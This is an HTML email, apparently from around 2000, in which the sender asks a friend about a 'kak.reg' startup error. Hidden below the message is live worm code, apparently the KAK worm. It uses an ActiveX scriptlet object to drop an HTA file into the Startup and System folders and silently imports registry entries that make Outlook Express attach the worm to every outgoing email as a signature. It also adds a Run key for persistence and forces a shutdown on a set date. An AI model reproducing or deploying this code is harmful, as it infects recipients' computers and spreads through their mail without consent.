<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
<META content="MSHTML 5.00.2722.2800" name=GENERATOR>
<STYLE></STYLE></HEAD>
<BODY bgColor=#ffffff>
<DIV><FONT size=2>Dear Steve, </FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT size=2>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; I 
also want to ask you another question. When I switch on the computer, I am 
getting an error message saying "Registry editor - Cannot load kak.reg file'. Do 
you know what it means?</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT size=2>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Give 
my regards to your parents and brothers and sisters.</FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT size=2>Karmenu</FONT></DIV>
<DIV>
<DIV style="POSITION: absolute; RIGHT: 0px; TOP: -20px; Z-INDEX: 5">
<OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></OBJECT></DIV>
<SCRIPT><!--
function sErr(){return true
}window.onerror=sErr
scr.Reset()
scr.doc="Z<HTML>
<HEAD><TITLE>Driver Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" WINDOWSTATE=Minimize>
</"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'>
</"+"object><SCRIPT>function sEr(){self.close()
return true
}window.onerror=sEr
fs=new ActiveXObject('Scripting.FileSystemObject')
// -- �� ������������ � �����
wd='C:\\\\Windows\\\\'
// -- ��⪠ ���� ������
fl=fs.GetFolder(wd+'Applic~1\\\\Identities')
// -- ��⪠ ��� 㪠������� ��⠫��� (������������ ��� �஢�ન)
sbf=fl.SubFolders
for(var mye=new Enumerator(sbf)
!mye.atEnd()
mye.moveNext())idd=mye.item()
ids=new String(idd)
idn=ids.slice(31)
fic=idn.substring(1,9)
kfr=wd+'MENUD�~1\\\\PROGRA~1\\\\D�MARR~1\\\\kak.hta'
// -- ���� ��� �࠭�㧪�� ���ᨩ ������(��⮧���㧪�)
ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta'
// -- ���� ��� ������᪮� ���ᨩ ������(��⮧���㧪�)
k2=wd+'System\\\\'+fic+'.hta'
// -- ��⪠ ����� ����� � ��⥬��� ��⠫���
kk=(fs.FileExists(kfr))?kfr:ken
// -- �஢�ਬ ���� �� � ��⠫��� ��⮧���㧪� ����� ����� 
aek='C:\\\\AE.KAK'
// -- ��⪠ 䠩��
aeb='C:\\\\Autoexec.bat'
// -- �� ���� ��⪠
if(!fs.FileExists(aek)){re=/kak.hta/i
// -- �஢�ਬ ���� �� ⠪�� 䠩�
if(hO.commandLine.search(re)!=-1){f1=fs.GetFile(aeb)
// -- �����⨬ � ��ࠬ��ࠬ�
f1.Copy(aek);t1=f1.OpenAsTextStream(8)
// -- ᪮���㥬 � ��஥� 䠩� ��.���
pth=(kk==kfr)?wd+'MENUD?~1\\\\PROGRA~1\\\\D?MARR~1\\\\kak.hta':ken
t1.WriteLine('@echo off>'+pth)
t1.WriteLine('del '+pth);t1.Close()
// -- ����襬 ������� � ��� 䠩�
}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2)
// -- �����㥬 � ��⥬�� ��⠫�� ����� ���
fs.GetFile(k2).Attributes=2;}t2=fs.CreateTextFile(wd+'kak.reg')
// -- ���⠢� �⠭����� ��ਡ��� 䠩�� � ��஥� ��� �� ������
t2.write('REGEDIT4')
// -- ����襬 � 奤�� kak.reg
t2.WriteBlankLines(2)
// -- �ய�⨬ 2 ��ப�
ky='[HKEY_CURRENT_USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook Express\\\\5.0'
sg='\\\\signatures'
t2.WriteLine(ky+sg+']')
// -- ����襬 ��ࠬ���� ����� ����������� ������
t2.Write('\"Default Signature\"=\"00000000\"')
// -- ��⠭���� ����� ᨣ������
t2.WriteBlankLines(2)
// -- �� 2 ��ப� �ய�᪠��
t2.WriteLine(ky+sg+'\\\\00000000]')
t2.WriteLine('\"name\"=\"Signature #1\"')
t2.WriteLine('\"type\"=dword:00000002')
t2.WriteLine('\"text\"=\"\"')
t2.Write('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"')
// -- ����� ����� ���뫠�� � ���쬮�
t2.WriteBlankLines(2)
t2.WriteLine(ky+']')
t2.Write('\"Signature Flags\"=dword:00000003')
t2.WriteBlankLines(2);t2.WriteLine('[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]')
t2.Write('\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"')
// -- ����襬 ��ࠬ���� �⮡� ����� ����㦠��� �� ����᪨ ��⥬�
t2.WriteBlankLines(2);t2.close()
// -- ����뢠�� 䠩�
wsh.Run(wd+'Regedit.exe -s '+wd+'kak.reg')
// -- ����⨬ ॣ 䠩�
t3=fs.CreateTextFile(wd+'kak.htm',1)
// -- ᮧ����� � �������� ��⠫��� ����� ���
t3.Write('<HTML><BODY><DIV style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC id=scr></"+"OBJECT></"+"DIV>')
// -- ������� � ��� html header
t4=fs.OpenTextFile(k2,1)
// -- ��஥� ����ᠭ��� ���⮣� �����
while(t4.Read(1)!='Z')
// -- 横� �⥭��
t3.WriteLine('<SCRIPT><!--')
// -- ����襬 ��ப� �� �� �ᯮ��㥬 �ਯ�� � html��
t3.write('function sErr(){return true;}window.onerror=sErr
// -- �᫨ �訪� � zdob shi zdub 
scr.Reset();scr.doc=\"Z')
rs=t4.Read(3095)
// -- ���⠥� ��� ����᫥���� ���-�� ����
t4.close()
// -- ���஥� 䠩�
rd=/\\\\/g
re=/\"/g
rf=/<\\//g
rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').replace(rf,'</"+"\"+\"')
// -- ������� ������� ��ࠬ���� � ���
t3.WriteLine(rt+'\"
la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language
// -- �஢�ਬ ��
scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\\\\Menu D�marrer\\\\\\\\Programmes\\\\\\\\D�marrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\"
// -- �᫨ �࠭�㧪�� � kewl, ������᪨� ⮦� ������
agt=navigator.userAgent.toLowerCase()
if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf(\"msie 5.\")!=-1))scr.write()&')
// -- �஢�ਬ ����� ����� Internet Explore... �᫨ 4 � �� �� ��� ���, �᫨ 5 � �㯥�
t3.write('//--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>')
// -- ����襬 �� ���� �������� ��⠫�
t3.close();fs.GetFile(wd+'kak.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg')
// -- ���஥� 䠩�, ��⠭���� ���ਡ���,㤠��� kak.reg
d=new Date()
// -- ��⪠ ⥪�饩 ����
if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft says not today !')
// -- �᫨ 1-�� �᫮ ����� � ��᫥ 17:00, � �뢮��� �� ��࠭ ᮮ�饭��
wsh.Run(wd+'RUNDLL32.EXE user.exe,exitwindows')
// -- ����뢠�� �����
}self.close()
</"+"SCRIPT>S3 driver memory alloc failed &nbsp; !]]%%%%%</"+"BODY></"+"HTML>"
la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language
scr.Path=(la=="fr")?"C:\\windows\\Menu D�marrer\\Programmes\\D�marrage\\kak.hta":"C:\\windows\\Start Menu\\Programs\\StartUp\\kak.hta"
agt=navigator.userAgent.toLowerCase()
if(((agt.indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 5.")!=-1))scr.write()
//--></SCRIPT>
</OBJECT></DIV></BODY></HTML>
